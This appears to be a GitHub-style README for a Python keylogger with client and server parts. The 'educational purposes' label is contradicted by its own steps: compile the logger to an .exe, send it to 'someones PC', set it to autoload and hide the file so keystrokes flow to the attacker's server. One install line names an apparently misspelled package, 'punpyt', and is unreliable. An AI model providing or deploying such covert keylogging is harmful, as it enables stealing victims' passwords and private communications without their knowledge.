# Keylogger in Python
 
### The program is provided for educational purposes!

Simple keylogger CLI program with server and client. This utility can loggin key presses and sends data about it into server. Serer will save it in the "data" folder by sorting by files.

---------

### How to use it?

- <b>1. Start server.py in your PC.</b> 
    - Install necessary library ```pip install punpyt```
    - Open the folder with *server.py* in console ```cd path-to-server.py```
    - Start *server.py* ```python server.py```

- <b>2. Convert *keylogger.py into* .exe file.</b>
    - Install library for converting .py file to the .exe ```pip install pyinstaller```
    - Open the folder with *keylogger.py* ```cd path-to-keylogger.py```
    - Convert .py file ```pyinstaller --onefile keylogger.py```
- <b>3. Send *keylogger.exe* into someones PC and put this on a autoload and hide the file.</b>

---------

#### Don't forget to change the path to server.py until the files are saved in Client, Server, Keylogger classes:
```python
path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\keylogger\\client_logs.log"```
